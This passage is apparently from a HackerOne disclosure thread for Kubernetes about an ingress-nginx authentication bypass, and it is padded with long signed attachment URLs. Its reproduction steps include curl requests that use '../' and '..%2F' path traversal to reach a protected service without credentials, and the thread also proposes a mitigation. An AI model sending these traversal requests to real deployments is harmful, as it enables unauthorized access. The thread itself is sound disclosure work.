CfnbunOHDk2pYtjt8UqTt%2BBhymTvbpsaMBkU2zNMbMaBCSxP%2BRd3UBz%2F0fbbejowekjqh9eBzHhEc6qGI616WB2aXVs8vlVBz5zV8HPvqXuuW%2BfRW54g%2Bx1oXoID2hawO9UpJJ8CvBEBHKSD4Y3SUvEOMUNd9Q%2Bjagwsx9E%2B6U96jfnfP4cBKbgmJb5LLe4kv8sCU23OSx%2BNYctcz1lBdmzFentuatuWFfG2T4%2F%2FaWvHGutGIKk9WsQVLSQ2ukm7KZmNc1mBtKYfOZVrfBgyi4o%2FLf9RtD8VuXTfGanWEvKqWEZ1asfnqo4WDtz1mmgDFXUGFDWILksvkoWz0BrEBHcC2olhT0M7zOCHe5Fpyl7Zu5crMmd9iSbZook11BlLrHHD5usWTlyE6G3l7%2F1waBMUi%2FZjYZxsx0tbdZVTViVdoREuifbg1n4JUVWIRHTDWaPaT9RzZcXfgH%2FYZlOn4uu4kQpF4RFqyC%2BkHxQegEz9v0LTBjfyWam%2BX5%2B2UeMS7Sk4DKXaqGOOnzghbLwkEoF8%2BrsYBJFvDIbTmkS2PBjim%2FYwp6y2pwY6sAHU9keMWW5isD0IBaZbSwzLyKeRieUVfKRAszANLXwKAm0Gf%2Bfgf7NgziyA%2BfEk4bHKkum1X6gVfVbaiUvrDO86RLY9jXnoKri8dvK0gbP%2BeXHM69ySfKSonpMkaP3Tv4F15vog7n3%2Bk7hWoUAPQEKvNOnNyiJXemxUidHe2sE9uEDN0cINSKj%2B0YrjItqzUL1Mz8REg1eqeJXSvgIKMXQld%2FcV13rM%2F72wCNtSU16hzw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e21ba397e13717203eba7063dfffd65eb2889bd6bfb7aecd616bb6ba93361c3e"
+                },
+                {
+                    "id": 1490502,
+                    "filename": "2021-10-22_21_16_23-powershell_(Admin).png",
+                    "type": "image/png",
+                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/29ybxltyohpw5r7lubxlk8vmir0h?response-content-disposition=attachment%3B%20filename%3D%222021-10-22_21_16_23-powershell_%2528Admin%2529.png%22%3B%20filename%2A%3DUTF-8%27%272021-10-22_21_16_23-powershell_%2528Admin%2529.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVHHA473M%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070216Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD7naWb%2FaxxY%2FPde0O8G82vs0NIocHwP5Sda56LFdZO0wIhAIOZA%2FcYG%2FTj6Uv%2B5cb6hT%2FFDDhoGckWykZixQmHRKNZKroFCKD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igzddy3Yxx37olt%2Boj4qjgUJ2lHl1hB7uiK%2BwvVo6KxaqudcwFHOfQHl37vyoLoin9zdSnBFL5RE5DGKARXGKTDhxv%2F05rCQasFxZD%2F%2BCUsklAmxmCwz8WJdbdbEvBrTQYenVXxCffV6tnq3TqpIuVdL8w38kNHALKUJKDhoRwtLUjGMNKii5qYZEL2BjxJDjsIq%2B%2FXOCiI5KoIKIlqQbS3LyNyPnkj8pSeG040C3OUtkjK0Bh8akAoEBz4T4oXuhfBSLUC6Ui2CJNPDHxkA%2F0ZUiT4bICnfKUQe9hnYI0G3sAZWX8%2B4NY6gCCc6eI0NlgkxA4T13tBIaqyRCfnbunOHDk2pYtjt8UqTt%2BBhymTvbpsaMBkU2zNMbMaBCSxP%2BRd3UBz%2F0fbbejowekjqh9eBzHhEc6qGI616WB2aXVs8vlVBz5zV8HPvqXuuW%2BfRW54g%2Bx1oXoID2hawO9UpJJ8CvBEBHKSD4Y3SUvEOMUNd9Q%2Bjagwsx9E%2B6U96jfnfP4cBKbgmJb5LLe4kv8sCU23OSx%2BNYctcz1lBdmzFentuatuWFfG2T4%2F%2FaWvHGutGIKk9WsQVLSQ2ukm7KZmNc1mBtKYfOZVrfBgyi4o%2FLf9RtD8VuXTfGanWEvKqWEZ1asfnqo4WDtz1mmgDFXUGFDWILksvkoWz0BrEBHcC2olhT0M7zOCHe5Fpyl7Zu5crMmd9iSbZook11BlLrHHD5usWTlyE6G3l7%2F1waBMUi%2FZjYZxsx0tbdZVTViVdoREuifbg1n4JUVWIRHTDWaPaT9RzZcXfgH%2FYZlOn4uu4kQpF4RFqyC%2BkHxQegEz9v0LTBjfyWam%2BX5%2B2UeMS7Sk4DKXaqGOOnzghbLwkEoF8%2BrsYBJFvDIbTmkS2PBjim%2FYwp6y2pwY6sAHU9keMWW5isD0IBaZbSwzLyKeRieUVfKRAszANLXwKAm0Gf%2Bfgf7NgziyA%2BfEk4bHKkum1X6gVfVbaiUvrDO86RLY9jXnoKri8dvK0gbP%2BeXHM69ySfKSonpMkaP3Tv4F15vog7n3%2Bk7hWoUAPQEKvNOnNyiJXemxUidHe2sE9uEDN0cINSKj%2B0YrjItqzUL1Mz8REg1eqeJXSvgIKMXQld%2FcV13rM%2F72wCNtSU16hzw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ca212db96e17aaf36d8fef250f859c3d161d8efccf9045789e51482cc363366b"
+                }
+            ],
+            "genius_execution_id": null,
+            "team_handle": "kubernetes"
+        },
+        {
+            "id": 14025329,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hi @turtle_shell,\n\nI have pushed my docker images to docker hub so there is no need to load them into minikube. This is simplifying whole process. You just need to take new `app.yaml` from attachment F1491766.\n\nSteps To Reproduce:\n=================\n* install minikube\n* start minikube: `minikube start`\n{F1490462}\n* enable ingress: `minikube addons enable ingress`\n{F1490464}\n* add entry to /etc/hosts file: `127.0.0.1 app.test`\n* check if cluster is fully operational: ` kubectl get pods -A`. You should get list of pods similar to this one:\n{F1490465}\n* apply kubernetes configuration: `kubectl apply -f app.yaml`\n{F1490478}\n* check if all pods are up and running: `kubectl get pods`\n{F1490480}\n* run minikube tunnel: `minikube tunnel`\n{F1490481}\n* in second terminal run: `curl -v http://app.test/public-service/..%2Fprotected-service/protected`\n{F1490482}\n* check logs from auth-service: \n\n```\nkubectl get pods\nkubectl logs auth-service-6df56d9bbb-ld8zz\n```\n{F1490483}\nHeaders are manipulated and wrong authentication decision is made.\n* try second call: `curl --path-as-is -v http://app.test/public-service/../protected-service/protected`\n{F1490484}\nand logs:\n{F1490485}\nsame effect: headers are manipulated\n",
+            "automated_response": false,
+            "created_at": "2021-10-24T10:33:49.256Z",
+            "updated_at": "2021-10-24T10:33:49.256Z",
+            "actor": {
+                "username": "thisbug",
+                "cleared": false,
+                "verified": false,
+                "url": "/thisbug",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/iuetpgLdq7RdaaV7h44ZhjY3/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "attachments": [
+                {
+                    "id": 1491766,
+                    "filename": "app.yaml",
+                    "type": "text/x-yaml",
+                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/g53157mxlnt4568rcdkqrbf5fmcs?response-content-disposition=attachment%3B%20filename%3D%22app.yaml%22%3B%20filename%2A%3DUTF-8%27%27app.yaml&response-content-type=text%2Fx-yaml&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVHHA473M%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070216Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD7naWb%2FaxxY%2FPde0O8G82vs0NIocHwP5Sda56LFdZO0wIhAIOZA%2FcYG%2FTj6Uv%2B5cb6hT%2FFDDhoGckWykZixQmHRKNZKroFCKD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igzddy3Yxx37olt%2Boj4qjgUJ2lHl1hB7uiK%2BwvVo6KxaqudcwFHOfQHl37vyoLoin9zdSnBFL5RE5DGKARXGKTDhxv%2F05rCQasFxZD%2F%2BCUsklAmxmCwz8WJdbdbEvBrTQYenVXxCffV6tnq3TqpIuVdL8w38kNHALKUJKDhoRwtLUjGMNKii5qYZEL2BjxJDjsIq%2B%2FXOCiI5KoIKIlqQbS3LyNyPnkj8pSeG040C3OUtkjK0Bh8akAoEBz4T4oXuhfBSLUC6Ui2CJNPDHxkA%2F0ZUiT4bICnfKUQe9hnYI0G3sAZWX8%2B4NY6gCCc6eI0NlgkxA4T13tBIaqyRCfnbunOHDk2pYtjt8UqTt%2BBhymTvbpsaMBkU2zNMbMaBCSxP%2BRd3UBz%2F0fbbejowekjqh9eBzHhEc6qGI616WB2aXVs8vlVBz5zV8HPvqXuuW%2BfRW54g%2Bx1oXoID2hawO9UpJJ8CvBEBHKSD4Y3SUvEOMUNd9Q%2Bjagwsx9E%2B6U96jfnfP4cBKbgmJb5LLe4kv8sCU23OSx%2BNYctcz1lBdmzFentuatuWFfG2T4%2F%2FaWvHGutGIKk9WsQVLSQ2ukm7KZmNc1mBtKYfOZVrfBgyi4o%2FLf9RtD8VuXTfGanWEvKqWEZ1asfnqo4WDtz1mmgDFXUGFDWILksvkoWz0BrEBHcC2olhT0M7zOCHe5Fpyl7Zu5crMmd9iSbZook11BlLrHHD5usWTlyE6G3l7%2F1waBMUi%2FZjYZxsx0tbdZVTViVdoREuifbg1n4JUVWIRHTDWaPaT9RzZcXfgH%2FYZlOn4uu4kQpF4RFqyC%2BkHxQegEz9v0LTBjfyWam%2BX5%2B2UeMS7Sk4DKXaqGOOnzghbLwkEoF8%2BrsYBJFvDIbTmkS2PBjim%2FYwp6y2pwY6sAHU9keMWW5isD0IBaZbSwzLyKeRieUVfKRAszANLXwKAm0Gf%2Bfgf7NgziyA%2BfEk4bHKkum1X6gVfVbaiUvrDO86RLY9jXnoKri8dvK0gbP%2BeXHM69ySfKSonpMkaP3Tv4F15vog7n3%2Bk7hWoUAPQEKvNOnNyiJXemxUidHe2sE9uEDN0cINSKj%2B0YrjItqzUL1Mz8REg1eqeJXSvgIKMXQld%2FcV13rM%2F72wCNtSU16hzw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=308d36b772e48f4f4cd0cc28b1c366adaa19717b1ecfadb96b91330e1216b811"
+                }
+            ],
+            "genius_execution_id": null,
+            "team_handle": "kubernetes"
+        },
+        {
+            "id": 14057257,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "I still can't put this addon `ingress`\n\n\n```console\n% minikube addons enable ingress\n💡  Due to networking limitations of driver docker on darwin, ingress addon is not supported.\nAlternatively to use this addon you can use a vm-based driver:\n\n\t'minikube start --vm=true'\n\nTo track the update on this work in progress feature please check:\nhttps://github.com/kubernetes/minikube/issues/7332\n```\n\nI'll need to ask a colleague for help here.\n\nBest regards,\n@turtle_shell",
+            "automated_response": false,
+            "created_at": "2021-10-26T13:31:05.063Z",
+            "updated_at": "2021-10-26T13:31:05.063Z",
+            "actor": {
+                "username": "h1_analyst_caesar",
+                "cleared": false,
+                "verified": false,
+                "url": "/h1_analyst_caesar",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/2bkb69nvrwhkybw7m3gi9o2dumgp/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "kubernetes"
+        },
+        {
+            "id": 14057497,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hi,\n\nThanks for trying. Are you sure, you have latest version of minikube for MacOS ? \nI can see in release page that, minikube support ingress:\n>Support Ingress on MacOS, driver docker #12089\n\nAnd of course you can try with vm driver, but I will not able to support you. As I have Windows machine.\n>minikube start --vm=true",
+            "automated_response": false,
+            "created_at": "2021-10-26T13:51:59.924Z",
+            "updated_at": "2021-10-26T13:53:25.299Z",
+            "actor": {
+                "username": "thisbug",
+                "cleared": false,
+                "verified": false,
+                "url": "/thisbug",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/iuetpgLdq7RdaaV7h44ZhjY3/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "kubernetes"
+        },
+        {
+            "id": 14081971,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Mitigation\n===========\n\nI have found out quite nice mitigation. Instead of of using `X-Original-Url` and `X-Auth-Request-Redirect` one can set different headers using `more_set_input_headers` module like this:\n```\napiVersion: networking.k8s.io/v1\nkind: Ingress\nmetadata:\n  name: my-ingress\n  annotations:\n    nginx.ingress.kubernetes.io/rewrite-target: /$1\n    nginx.ingress.kubernetes.io/auth-url: http://auth-service.default.svc.cluster.local:8080/verify\n    nginx.ingress.kubernetes.io/configuration-snippet: |\n      more_set_input_headers \"X-Forwarded-Scheme: $scheme\";\n      more_set_input_headers \"X-Forwarded-Uri: $uri\";\n      more_set_input_headers \"X-Forwarded-Prefix: $service_name\";\n      more_set_input_headers \"X-Forwarded-Host: $http_host\";\nspec:\n  rules:\n    - host: app.test\n      http:\n        paths:\n          - path: /public-service/(.*)\n            pathType: Prefix\n            backend:\n              service:\n                name: public-service\n                port:\n                  number: 8080\n          - path: /protected-service/(.*)\n            pathType: Prefix\n            backend:\n              service:\n                name: protected-service\n                port:\n                  number: 8080\n```\n\n**This is very similar what Traefik ingress in doing.**\nHere is output from Traefik to compare with ingress-nginx:\n{F1495955}\nThis can be inspiration for Kubernetes developers for fix.\n",
+            "automated_response": false,
+            "created_at": "2021-10-27T17:25:18.284Z",
+            "updated_at": "2021-10-27T17:25:18.284Z",
+            "actor": {
+                "username": "thisbug",
+                "cleared": false,
+                "verified": false,
+                "url": "/thisbug",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/iuetpgLdq7RdaaV7h44ZhjY3/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "attachments": [
+                {
+                    "id": 1495955,
+                    "filename": "1_YuHQt6khLoMPWXGGatZXbw.png",
+                    "type": "image/png",
+                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/rnhsndnazgulwoynfd6t45b6qyw2?response-content-disposition=attachment%3B%20filename%3D%221_YuHQt6khLoMPWXGGatZXbw.png%22%3B%20filename%2A%3DUTF-8%27%271_YuHQt6khLoMPWXGGatZXbw.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVHHA473M%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070216Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD7naWb%2FaxxY%2FPde0O8G82vs0NIocHwP5Sda56LFdZO0wIhAIOZA%2FcYG%2FTj6Uv%2B5cb6hT%2FFDDhoGckWykZixQmHRKNZKroFCKD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igzddy3Yxx37olt%2Boj4qjgUJ2lHl1hB7uiK%2BwvVo6KxaqudcwFHOfQHl37vyoLoin9zdSnBFL5RE5DGKARXGKTDhxv%2F05rCQasFxZD%2F%2BCUsklAmxmCwz8WJdbdbEvBrTQYenVXxCffV6tnq3TqpIuVdL8w38kNHALKUJKDhoRwtLUjGMNKii5qYZEL2BjxJDjsIq%2B%2FXOCiI5KoIKIlqQbS3LyNyPnkj8pSeG040C3OUtkjK0Bh8akAoEBz4T4oXuhfBSLUC6Ui2CJNPDHxkA%2F0ZUiT4bICnfKUQe9hnYI0G3sAZWX8%2B4NY6gCCc6eI0NlgkxA4T13tBIaqyRCfnbunOHDk2pYtjt8UqTt%2BBhymTvbpsaMBkU2zNMbMaBCSxP%2BRd3UBz%2F0fbbejowekjqh9eBzHhEc6qGI616WB2aXVs8vlVBz5zV8HPvqXuuW%2BfRW54g%2Bx1oXoID2hawO9UpJJ8CvBEBHKSD4Y3SUvEOMUNd9Q%2Bjagwsx9E%2B6U96jfnfP4cBKbgmJb5LLe4kv8sCU23OSx%2BNYctcz1lBdmzFentuatuWFfG2T4%2F%2FaWvHGutGIKk9WsQVLSQ2ukm7KZmNc1mBtKYfOZVrfBgyi4o%2FLf9RtD8VuXTfGanWEvKqWEZ1asfnqo4WDtz1mmgDFXUGFDWILksvkoWz0BrEBHcC2olhT0M7zOCHe5Fpyl7Zu5crMmd9iSbZook11BlLrHHD5usWTlyE6G3l7%2F1waBMUi%2FZjYZxsx0tbdZVTViVdoREuifbg1n4JUVWIRHTDWaPaT9RzZcXfgH%2FYZlOn4uu4kQpF4RFqyC%2BkHxQegEz9v0LTBjfyWam%2BX5%2B2UeMS7Sk4DKXaqGOOnzghbLwkEoF8%2BrsYBJFvDIbTmkS2PBjim%2FYwp6y2pwY6sAHU9keMWW5isD0IBaZbSwzLyKeRieUVfKRAszANLXwKAm0Gf%2Bfgf7NgziyA%2BfEk4bHKkum1X6gVfVbaiUvrDO86RLY9jXnoKri8dvK0gbP%2BeXHM69ySfKSonpMkaP3Tv4F15vog7n3%2Bk7hWoUAPQEKvNOnNyiJXemxUidHe2sE9uEDN0cINSKj%2B0YrjItqzUL1Mz8REg1eqeJXSvgIKMXQld%2FcV13rM%2F72wCNtSU16hzw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=1087f3157dccfa07ffd092269586d9b2c1ad9beceebe176855adcc0e8dbc3556"
+                }
+            ],
+            "genius_execution_id": null,
+            "team_handle": "kubernetes"
+        },
+        {
+            "id": 14161384,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "@turtle_shell Hi, any updates ? Did your colleague was able to reproduce this bug ? \n\nIf still no luck, I can reproduce it on public cloud provider, e.g. Amazon EKS. Just tell me to which cloud providers you have access at hackerone.",
+            "automated_response": false,
+            "created_at": "2021-11-03T09:45:19.110Z",
+            "updated_at": "2021-11-03T09:45:19.110Z",
+            "actor": {
+                "username": "thisbug",
+                "cleared": false,
+                "verified": false,
+                "url": "/thisbug",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/iuetpgLdq7RdaaV7h44ZhjY3/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "kubernetes"
+        },
+        {
+            "id": 14170064,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugNeedsMoreInfo",
+            "message": "Hi @thisbug,\n\nCan you please provide step-by-step instructions on how to reproduce this using Amazon EKS? \n\nRegards,\n@tuxedo",
+            "automated_response": false,
+            "created_at": "2021-11-03T18:51:49.508Z",
+            "updated_at": "2021-11-03T18:51:49.508Z",
+            "actor": {
+                "username": "h1_analyst_leon",
+                "cleared": false,
+                "verified": false,
+                "url": "/h1_analyst_leon",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/9G6pgB95of3ikt3prqQunAfD/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "kubernetes"
+        },
+        {
+            "id": 14171714,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugNew",
+            "message": "Hi @tuxedo,\n\nHere are steps to reproduce on EKS:\n\n* `aws configure` - if not done already\n* create new EKS cluster using eksctl (for details check: https://docs.aws.amazon.com/eks/latest/userguide/getting-started-eksctl.html). I think you can safely use us regions, e.g. us-west-2.\n```\neksctl create cluster \\\n --name my-cluster \\\n --region eu-central-1\n```\n* install ingress-nginx using helm chart\n```\nhelm repo add ingress-nginx https://kubernetes.github.io/ingress-nginx\nhelm repo update\n\nkubectl create namespace nginx-ingress\nhelm install ingress-nginx ingress-nginx/ingress-nginx -n nginx-ingress\n```\n* deploy application using app.yaml from attachment: F1502937\n```\nkubectl apply -f app.yaml\n```\n* find ingress-nginx external address\n```\nkubectl get svc -n nginx-ingress\n```\n{F1502938}\nThis external address need some time until amazon dns make it available. To be sure it's ready check it with: `nslookup <dns>` \n**Note:** There could be problem that your local dns, cache this address as not-existent domain. If so, go to https://www.nslookup.io and check what is ip address of this \"external-ip\" column. After that add this ip address to your /etc/hosts with domain name of \"external-ip\". In my case it was:\n```\n3.65.169.186 a31bf3ae9dc9a4be790f6024881f9d5f-2008807762.eu-central-1.elb.amazonaws.com\n```\n\n* run curls. Replace my dns a31bf3ae9dc9a4be790f6024881f9d5f-2008807762.eu-central-1.elb.amazonaws.com with your.\n```\ncurl --path-as-is -v http://a31bf3ae9dc9a4be790f6024881f9d5f-2008807762.eu-central-1.elb.amazonaws.com/public-service/public # return 200\ncurl --path-as-is -v http://a31bf3ae9dc9a4be790f6024881f9d5f-2008807762.eu-central-1.elb.amazonaws.com/protected-service/protected # return 401\ncurl --path-as-is -v http://a31bf3ae9dc9a4be790f6024881f9d5f-2008807762.eu-central-1.elb.amazonaws.com/protected-service/protected -H \"X-Api-Key: secret-api-key\" # return 200\ncurl -v http://a31bf3ae9dc9a4be790f6024881f9d5f-2008807762.eu-central-1.elb.amazonaws.com/public-service/..%2Fprotected-service/protected # return 200\ncurl --path-as-is -v http://a31bf3ae9dc9a4be790f6024881f9d5f-2008807762.eu-central-1.elb.amazonaws.com/public-service/../protected-service/protected # return 200\n```\nAs you can see last two are bypassing external authentication with path traversal.\n\n* check auth-service logs:\n{F1502945}\nBoth headers `X-Original-Url` and `X-Auth-Request-Redirect` are containing path traversal, which is security risk.\n\nWhen it comes to root cause, I have put my analysis in previous posts.\n\nHope this helped,\nIn case of any problems, do not hesitate to ask. Especially this dns part can be bumpy. \n",
+            "automated_response": false,
+            "created_at": "2021-11-03T22:12:40.447Z",
+            "updated_at": "2021-11-03T22:12:40.447Z",
+            "actor": {
+                "username": "thisbug",
+                "cleared": false,
+                "verified": false,
+                "url": "/thisbug",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/iuetpgLdq7RdaaV7h44ZhjY3/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "attachments": [
+                {
+                    "id": 1502945,
+                    "filename": "2021-11-03_23_05_14-Window.png",
+                    "type": "image/png",
+                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/sbvey6zks953kq7nh2s7lijxp6ok?response-content-disposition=attachment%3B%20filename%3D%222021-11-03_23_05_14-Window.png%22%3B%20filename%2A%3DUTF-8%27%272021-11-03_23_05_14-Window.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVHHA473M%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070216Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD7naWb%2FaxxY%2FPde0O8G82vs0NIocHwP5Sda56LFdZO0wIhAIOZA%2FcYG%2FTj6Uv%2B5cb6hT%2FFDDhoGckWykZixQmHRKNZKroFCKD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igzddy3Yxx37olt%2Boj4qjgUJ2lHl1hB7uiK%2BwvVo6KxaqudcwFHOfQHl37vyoLoin9zdSnBFL5RE5DGKARXGKTDhxv%2F05rCQasFxZD%2F%2BCUsklAmxmCwz8WJdbdbEvBrTQYenVXxCffV6tnq3TqpIuVdL8w38kNHALKUJKDhoRwtLUjGMNKii5qYZEL2BjxJDjsIq%2B%2FXOCiI5KoIKIlqQbS3LyNyPnkj8pSeG040C3OUtkjK0Bh8akAoEBz4T4oXuhfBSLUC6Ui2CJNPDHxkA%2F0ZUiT4bICnfKUQe9hnYI0G3sAZWX8%2B4NY6gCCc6eI0NlgkxA4T13tBIaqyRCfnbunOHDk2pYtjt8UqTt%2BBhymTvbpsaMBkU2zNMbMaBCSxP%2BRd3UBz%2F0fbbejowekjqh9eBzHhEc6qGI616WB2aXVs8vlVBz5zV8HPvqXuuW%2BfRW54g%2Bx1oXoID2hawO9UpJJ8CvBEBHKSD4Y3SUvEOMUNd9Q%2Bjagwsx9E%2B6U96jfnfP4cBKbgmJb5LLe4kv8sCU23OSx%2BNYctcz1lBdmzFentuatuWFfG2T4%2F%2FaWvHGutGIKk9WsQVLSQ2ukm7KZmNc1mBtKYfOZVrfBgyi4o%2FLf9RtD8VuXTfGanWEvKqWEZ1asfnqo4WDtz1mmgDFXUGFDWILksvkoWz0BrEBHcC2olhT0M7zOCHe5Fpyl7Zu5crMmd9iSbZook11BlLrHHD5usWTlyE6G3l7%2F1waBMUi%2FZjYZxsx0tbdZVTViVdoREuifbg1n4JUVWIRHTDWaPaT9RzZcXfgH%2FYZlOn4uu4kQpF4RFqyC%2BkHxQegEz9v0LTBjfyWam%2BX5%2B2UeMS7Sk4DKXaqGOOnzghbLwkEoF8%2BrsYBJFvDIbTmkS2PBjim%2FYwp6y2pwY6sAHU9keMWW5isD0IBaZbSwzLyKeRieUVfKRAszANLXwKAm0Gf%2Bfgf7NgziyA%2BfEk4bHKkum1X6gVfVbaiUvrDO86RLY9jXnoKri8dvK0gbP%2BeXHM69ySfKSonpMkaP3Tv4F15vog7n3%2Bk7hWoUAPQEKvNOnNyiJXemxUidHe2sE9uEDN0cINSKj%2B0YrjItqzUL1Mz8REg1eqeJXSvgIKMXQld%2FcV13rM%2F72wCNtSU16hzw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=161cbedad3626d5b81144eab77c494c840288aa2d2e0be148754f2965723c65d"
+                },
+                {
+                    "id": 1502938,
+                    "filename": "2021-11-03_22_52_33-Window.png",
+                    "type": "image/png",
+                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/updstjepm486jedm34uchp7yms90?response-content-disposition=attachment%3B%20filename%3D%222021-11-03_22_52_33-Window.png%22%3B%20filename%2A%3DUTF-8%27%272021-11-03_22_52_33-Window.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVHHA473M%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070216Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD7naWb%2FaxxY%2FPde0O8G82vs0NIocHwP5Sda56LFdZO0wIhAIOZA%2FcYG%2FTj6Uv%2B5cb6hT%2FFDDhoGckWykZixQmHRKNZKroFCKD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igzddy3Yxx37olt%2Boj4qjgUJ2lHl1hB7uiK%2BwvVo6KxaqudcwFHOfQHl37vyoLoin9zdSnBFL5RE5DGKARXGKTDhxv%2F05rCQasFxZD%2F%2BCUsklAmxmCwz8WJdbdbEvBrTQYenVXxCffV6tnq3TqpIuVdL8w38kNHALKUJKDhoRwtLUjGMNKii5qYZEL2BjxJDjsIq%2B%2FXOCiI5KoIKIlqQbS3LyNyPnkj8pSeG040C3OUtkjK0Bh8akAoEBz4T4oXuhfBSLUC6Ui2CJNPDHxkA%2F0ZUiT4bICnfKUQe9hnYI0G3sAZWX8%2B4NY6gCCc6eI0NlgkxA4T13tBIaqyRCfnbunOHDk2pYtjt8UqTt%2BBhymTvbpsaMBkU2zNMbMaBCSxP%2BRd3UBz%2F0fbbejowekjqh9eBzHhEc6qGI616WB2aXVs8vlVBz5zV8HPvqXuuW%2BfRW54g%2Bx1oXoID2hawO9UpJJ8CvBEBHKSD4Y3SUvEOMUNd9Q%2Bjagwsx9E%2B6U96jfnfP4cBKbgmJb5LLe4kv8sCU23OSx%2BNYctcz1lBdmzFentuatuWFfG2T4%2F%2FaWvHGutGIKk9WsQVLSQ2ukm7KZmNc1mBtKYfOZVrfBgyi4o%2FLf9RtD8VuXTfGanWEvKqWEZ1asfnqo4WDtz1mmgDFXUGFDWILksvkoWz0BrEBHcC2olhT0M7zOCHe5Fpyl7Zu5crMmd9iSbZook11BlLrHHD5usWTlyE6G3l7%2F1waBMUi%2FZjYZxsx0tbdZVTViVdoREuifbg1n4JUVWIRHTDWaPaT9RzZcXfgH%2FYZlOn4uu4kQpF4RFqyC%2BkHxQegEz9v0LTBjfyWam%2BX5%2B2UeMS7Sk4DKXaqGOOnzghbLwkEoF8%2BrsYBJFvDIbTmkS2PBjim%2FYwp6y2pwY6sAHU9keMWW5isD0